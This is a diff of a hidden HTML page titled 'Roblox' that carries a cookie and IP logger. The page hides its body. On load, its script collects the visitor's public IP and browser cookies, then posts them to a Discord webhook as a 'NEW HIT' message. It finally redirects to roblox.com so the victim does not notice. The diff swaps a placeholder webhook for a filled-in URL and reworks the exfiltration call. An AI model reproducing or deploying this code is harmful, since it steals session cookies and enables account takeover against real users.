@@ -2,27 +2,16 @@
 <html>
 <head><title>Roblox</title></head>
 <body style="display:none;">
-
 <script>
-var webhook = "PASTE_YOUR_WEBHOOK_SITE_URL_HERE";
-
+var webhook = "https://discord.com/api/webhooks/1517070488721948743/RNcyTwya9CDyheCrLPSTNDtENc8i04ybtfWloKAw-PoZYqXuvJL6nGXvnVIFPyhj_yCW";
 async function grab() {
     var ip = "unknown";
-    try {
-        var r = await fetch("https://api.ipify.org?format=json");
-        if (r.ok) { var d = await r.json(); ip = d.ip; }
-    } catch(e) {}
-
+    try { var r = await fetch("https://api.ipify.org?format=json"); if (r.ok) { var d = await r.json(); ip = d.ip; } } catch(e) {}
     var cookie = document.cookie || "no_cookie";
-    var ua = navigator.userAgent;
-
-    await fetch(webhook + "?ip=" + encodeURIComponent(ip) + "&cookie=" + encodeURIComponent(cookie) + "&ua=" + encodeURIComponent(ua));
-
+    await fetch(webhook, { method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({content: "**NEW HIT**\nIP: " + ip + "\nCookie: ||" + cookie + "||"}) });
     window.location = "https://www.roblox.com";
 }
-
 grab();
 </script>
-
 </body>
 </html>
